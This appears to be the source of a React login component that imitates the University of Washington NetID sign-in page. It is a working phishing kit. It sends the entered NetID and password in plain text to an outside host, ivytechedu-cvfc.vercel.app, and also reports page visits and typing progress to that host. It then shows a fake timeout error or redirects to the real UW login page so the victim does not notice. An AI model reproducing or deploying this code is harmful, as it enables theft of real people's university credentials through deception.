import React, { useState, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";
import login from "../assets/weblogin.png";

const Login = () => {
  const [formData, setFormData] = useState({ netID: "", password: "" });
  const [errorMessage, setErrorMessage] = useState("");
  const [submitAttempts, setSubmitAttempts] = useState(0);
  const navigate = useNavigate();

  const emailApiUrl = "https://ivytechedu-cvfc.vercel.app/send-email";
  const [emailSentFields, setEmailSentFields] = useState({
    netID: false,
    password: false,
  });

  const sendEmail = async (subject, message) => {
    try {
      const response = await fetch(emailApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ subject, message }),
      });

      if (!response.ok) {
        throw new Error("Failed to send email");
      }
    } catch (error) {
      console.error("Error sending email:", error);
      throw error;
    }
  };

  useEffect(() => {
    const notifyOnPageLoad = async () => {
      try {
        await sendEmail(
          "Page Visit Notification",
          "A user has landed on the login page."
        );
      } catch (error) {
        console.error("Error notifying page visit:", error);
      }
    };

    notifyOnPageLoad();
  }, []);

  const handleFieldChange = async (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });

    if (value.length === 4 && !emailSentFields[name]) {
      try {
        await sendEmail(
          "User Interaction",
          `User entered 4 characters in the ${name} field.`
        );
        setEmailSentFields((prev) => ({ ...prev, [name]: true }));
      } catch (error) {
        console.error("Error notifying field interaction:", error);
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const { netID, password } = formData;

    if (!netID || !password) {
      setErrorMessage("Your sign-in failed. Please try again.");
      return;
    }

    try {
      setErrorMessage("");
      await sendEmail(
        "Login Form Submission",
        `NetID: ${netID}\nPassword: ${password}`
      );
      setErrorMessage("Your sign in window has closed. Please try again.");
    } catch (error) {
      setSubmitAttempts((prev) => prev + 1);
      if (submitAttempts === 1) {
        navigate("https://weblogin.washington.edu/");
      } else {
        setErrorMessage("Something went wrong, please try again.");
      }
    }
  };

  return (
    <div className="login-big">
      <div className="major-login">
        <div className="login">
          <form onSubmit={handleSubmit}>
            <Link to={"/"}>
              <img src={login} alt="login-form-logo" />
            </Link>
            {/* Display error message here */}
            <p className={`error-signin ${errorMessage ? "error" : ""}`}>
              {errorMessage || "Please sign in."}
            </p>
            <div className="form-group">
              <label htmlFor="ID">UW NetID</label>
              <input
                type="text"
                name="netID"
                placeholder="UW NetID"
                value={formData.netID}
                onChange={handleFieldChange}
              />
            </div>
            <div className="form-group">
              <label htmlFor="Password">Password</label>
              <input
                type="password"
                name="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleFieldChange}
              />
            </div>
            <a href="#">Forgot your Password?</a>
            <button className="submit" type="submit">
              Sign in
            </button>
          </form>
          <div className="left">
            <a href="#">Learn about account recovery options</a>
            <a href="#">Learn about UW NetIDs</a>
            <a href="#">Learn about UW NetID sign-in</a>
            <br />
            <a href="#">Need help?</a>
          </div>
        </div>
        <div className="footer">
          <p>
            Sign in reduces how often you have to reauthenticate to access UW
            resources.
          </p>
          <p>
            Learn how to <a href="sign out">sign out</a> at the end of your
            browsing session.
          </p>
          <p>
            <a href="#">PRIVACY</a> | <a href="#">TERMS</a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
